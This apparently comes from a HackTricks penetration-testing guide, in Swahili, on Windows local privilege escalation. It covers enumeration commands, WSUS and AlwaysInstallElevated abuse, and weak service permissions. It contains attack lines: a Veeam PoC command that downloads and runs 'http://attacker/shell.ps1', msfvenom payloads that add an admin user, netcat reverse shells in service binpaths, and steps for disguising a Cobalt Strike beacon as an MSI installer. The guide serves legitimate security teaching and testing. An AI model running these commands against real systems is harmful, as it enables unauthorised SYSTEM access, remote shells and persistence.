# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora zaidi la kutafuta vectors za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui Access Tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Viwango vya Uadilifu

**Ikiwa hujui integrity levels katika Windows ni nini, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali katika Windows ambayo yanaweza **kukuzuia ku-enumerate mfumo**, kuendesha executables au hata **kugundua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **ku-enumerate** **defenses** hizi zote na **mechanisms** zake kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila prompts wakati ukaguzi wa secure-path wa AppInfo umepitwa. Angalia workflow maalum ya bypass ya UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa registry wa Secure Desktop accessibility unaweza kutumiwa vibaya kufanya registry write yoyote kwa SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Windows builds za hivi karibuni pia zilianzisha njia ya **SMB arbitrary-port** ya LPE, ambapo privileged local NTLM authentication hu-reflectiwa kupitia SMB TCP connection iliyotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za version

Angalia ikiwa Windows version ina vulnerability yoyote inayojulikana (pia angalia patches zilizotumika).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits za Matoleo

Hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu security vulnerabilities za Microsoft. Database hii ina zaidi ya security vulnerabilities 4,700, ikionyesha **attack surface kubwa sana** ambayo Windows environment inatoa.

**Kwenye system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson ndani yake)_

**Kwenye system locally kwa kutumia taarifa za system**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Je, kuna credential/Juicy info yoyote iliyohifadhiwa kwenye env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha hii kwenye [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline hurekodiwa, yakijumuisha commands zilizotekelezwa, command invocations, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output huenda yasinaswe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya documentation, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuangalia matukio 15 ya mwisho kutoka kwenye logs za PowersShell, unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hukusanywa, na kuhakikisha kwamba kila block ya code inaandikwa inapotekelezwa. Mchakato huu huhifadhi audit trail pana ya kila shughuli, yenye thamani kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato huo hutolewa.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya logging ya Script Block yanaweza kupatikana ndani ya Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuangalia matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Mtandao
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kuathiri mfumo ikiwa masasisho hayaombwi kwa kutumia http**S** bali http.

Unaanza kwa kuangalia ikiwa mtandao unatumia WSUS update isiyo ya SSL kwa kuendesha yafuatayo kwenye cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au ifuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ukipata jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **inaweza kutumiwa vibaya.** Ikiwa thamani ya mwisho ya registry ni sawa na 0, ingizo la WSUS litapuuzwa.

Ili kutumia vulnerabilities hizi vibaya, unaweza kutumia tools kama vile: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za exploits za MiTM zilizotayarishwa kuingiza updates 'bandia' kwenye WSUS traffic isiyo ya SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hili ndilo dosari inayotumiwa vibaya na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates inatumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) locally ili kuingilia traffic yetu wenyewe na kuendesha code kama mtumiaji mwenye privileges zilizoinuliwa kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa service ya WSUS hutumia mipangilio ya mtumiaji wa sasa, itatumia pia certificate store yake. Tukitengeneza self-signed certificate kwa hostname ya WSUS na kuongeza certificate hiyo kwenye certificate store ya mtumiaji wa sasa, tutaweza kuingilia traffic ya WSUS ya HTTP na HTTPS. WSUS haitumii mechanisms kama HSTS kutekeleza validation ya aina ya trust-on-first-use kwenye certificate. Ikiwa certificate iliyowasilishwa inaaminika na mtumiaji na ina hostname sahihi, itakubaliwa na service.

Unaweza kutumia vulnerability hii kwa tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara tu itakapoachiliwa).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Agents wengi wa enterprise hufichua localhost IPC surface na update channel yenye privileges. Ikiwa enrollment inaweza kulazimishwa kuelekea attacker server na updater ikaamini rogue root CA au ukaguzi dhaifu wa signer, local user anaweza kuwasilisha MSI hasidi ambayo SYSTEM service hu-install. Tazama technique ya jumla (inayotegemea Netskope stAgentSvc chain – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` hufichua service ya localhost kwenye **TCP/9401** inayochakata messages zinazodhibitiwa na attacker, na kuruhusu commands kiholela kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: thibitisha listener na version, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory hiyo hiyo, kisha trigger SYSTEM payload kupitia local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma hutekeleza command kama SYSTEM.
## KrbRelayUp

Athari ya **local privilege escalation** ipo katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambayo LDAP signing **haijalazimishwa,** users wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na users wana uwezo wa kuunda computers ndani ya domain. Ni muhimu kutambua kwamba **requirements** hizi hutimizwa kwa kutumia default settings.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa attack, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** hizi registers 2 **zimewezeshwa** (value ikiwa ni **0x1**), basi users wenye privilege yoyote wanaweza **ku-install** (execute) mafaili ya `*.msi` kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una session ya meterpreter, unaweza kugeuza technique hii kuwa ya kiotomatiki kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia command ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya directory ya sasa Windows MSI binary ya ku-escalate privileges. Script hii huandika MSI installer iliyotengenezwa awali ambayo huomba kuongeza user/group (kwa hivyo utahitaji GIU access):
```
Write-UserAddMSI
```
Tekeleza tu binary iliyoundwa ili kuongeza privileges.

### MSI Wrapper

Soma tutorial hii ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia tools hizi. Kumbuka kwamba unaweza ku-wrap faili la "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** kwa kutumia Cobalt Strike au Metasploit **new Windows EXE TCP payload** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" katika kisanduku cha kutafutia. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Wape mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufikie hatua ya 3 kati ya 4 (chagua files za kujumuisha). Bofya **Add** na uchague Beacon payload uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Highlight mradi wa **AlwaysPrivesc** katika **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna properties nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ambazo zinaweza kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya kulia mradi na uchague **View > Custom Actions**.
- Bofya kulia **Install** na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili lako la **beacon.exe** na ubofye **OK**. Hii itahakikisha kwamba Beacon payload inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Hatimaye, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hasidi la `.msi` katika **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kutumia vulnerability hii unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Mipangilio hii huamua kile kinachokuwa **logged**, kwa hivyo unapaswa kuzingatia.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua logs zinatumwa wapi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, ikihakikisha kwamba kila nywila ni **ya kipekee, imetengenezwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, hivyo kuwaruhusu kuona nywila za local admin ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyoaminika ya **kusoma kumbukumbu yake** au kuingiza code, hivyo kuimarisha zaidi usalama wa mfumo.\
[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash.| [**Maelezo zaidi kuhusu Credentials Guard hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, **domain credentials** za mtumiaji kwa kawaida huanzishwa.\
[**Maelezo zaidi kuhusu Cached Credentials hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia kama kikundi chochote unachoshiriki kina ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vyenye privileges

Ikiwa **wewe ni mwanachama wa kikundi chenye privileges, huenda ukaweza ku-escalate privileges**. Jifunze kuhusu vikundi vyenye privileges na jinsi ya kuvitumia vibaya ili ku-escalate privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu **token** ni nini katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions
```bash
qwinsta
klist sessions
```
### Home folders
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Password Policy
```bash
net accounts
```
### Pata maudhui ya clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Inayoendesha

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato, **angalia passwords ndani ya command line ya mchakato**.\
Angalia ikiwa unaweza **ku-overwrite binary inayoendesha** au ikiwa una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kagua kila wakati **electron/cef/chromium debuggers** zinazotumika; unaweza kuzitumia vibaya ili kupata [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Kukagua ruhusa za binaries za processes**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za folda za binary za processes (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda memory dump ya process inayoendelea kwa kutumia **procdump** kutoka sysinternals. Services kama FTP huwa na **credentials katika maandishi wazi kwenye memory**; jaribu ku-dump memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Applications zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kuanzisha CMD, au kuvinjari directories.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

## Huduma

Service Triggers huruhusu Windows kuanzisha service masharti fulani yanapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kuwasili kwa kifaa, GPO refresh, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha services zenye privileges kwa kuwasha triggers zake. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inapendekezwa kuangalia ikiwa "Authenticated Users" wanaweza kurekebisha service yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ikiwa unapata hitilafu hii (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwasha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Zingatia kwamba service upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Workaround nyingine** ya tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha executable binary ya service. Ili kurekebisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha huduma upya
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Mapendeleo yanaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu usanidi upya wa service binary.
- **WRITE_DAC**: Huwezesha usanidi upya wa ruhusa, na hivyo kuruhusu kubadilisha service configurations.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha service configurations.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha service configurations.

Kwa ajili ya kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za service binaries

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au privileged domain account, lakini **low-privileged users wanaweza kurekebisha service EXE au parent folder yake**, service mara nyingi inaweza kutekwa kwa **kubadilisha binary na kuanzisha upya service**.

**Angalia ikiwa unaweza kurekebisha binary inayotekelezwa na service** au ikiwa una **write permissions kwenye folder** ambako binary hiyo iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (isiyo katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Tafuta ACL hatari zilizotolewa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au kwenye directory iliyo nayo. Mtiririko wa vitendo wa abuse ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na path ya executable kwa kutumia `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha binary ya service na payload au binary halali ya malicious service.
4. Anzisha upya service kwa `sc stop <service_name> && sc start <service_name>` (au subiri reboot / service trigger).

Ukaguzi wa kiotomatiki wenye manufaa:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Ikiwa service hairuhusu mtumiaji wa kawaida kuianzisha upya, angalia ikiwa huanza kiotomatiki wakati wa boot, ina failure action inayoianzisha tena, au inaweza kuanzishwa kwa njia isiyo ya moja kwa moja na application inayoitumia.

### Permissions za kurekebisha service registry

Unapaswa kuangalia ikiwa unaweza kurekebisha service registry yoyote.\
Unaweza **kuangalia** **permissions** zako kwenye **service registry** kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuchunguzwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** zina ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race ya kuandika value yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda keys za **ATConfig** kwa kila user ambazo baadaye hunakiliwa na process ya **SYSTEM** kwenye session key ya HKLM. **Symbolic link race** ya registry inaweza kuelekeza upya write hiyo yenye privileges kwenda kwenye **path yoyote ya HKLM**, na hivyo kutoa primitive ya kuandika **value yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
